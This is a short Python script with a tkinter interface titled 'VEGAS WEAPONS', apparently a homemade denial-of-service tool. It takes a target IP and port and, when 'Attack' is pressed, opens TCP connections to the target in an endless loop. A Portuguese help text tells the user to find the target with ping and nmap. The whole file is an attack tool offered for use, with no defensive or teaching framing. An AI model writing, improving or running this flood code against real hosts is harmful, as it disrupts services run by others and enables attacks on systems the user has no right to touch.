import tkinter as tk
import socket

def info():
    print (f''' Para obter o endereço de IP do seu alvo,
    basta utilizar o comando ping e o url do site no terminal
    para saber em qual porta o serviço está rodando, basta
    utilizar o comando e o nmap url do site. ''')

def attack():
    target = target_entry.get()
    port = int(port_entry.get())
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        print("ATTACKING IP --> ", target)

app = tk.Tk()
app.title("VEGAS WEAPONS")

title_label = tk.Label(app, text="VEGAS WEAPONS", font=("Helvetica", 18))
title_label.grid(row=0, column=0, columnspan=2, padx=10, pady=10)

target_label = tk.Label(app, text="Target IP:")
target_label.grid(row=1, column=0, padx=10, pady=5)

target_entry = tk.Entry(app)
target_entry.grid(row=1, column=1, padx=10, pady=5)

port_label = tk.Label(app, text="Port from Target:")
port_label.grid(row=2, column=0, padx=10, pady=5)

port_entry = tk.Entry(app)
port_entry.grid(row=2, column=1, padx=10, pady=5)

attack_button = tk.Button(app, text="Attack", command=attack)
attack_button.grid(row=3, column=0, columnspan=2, padx=10, pady=10)

app.mainloop()
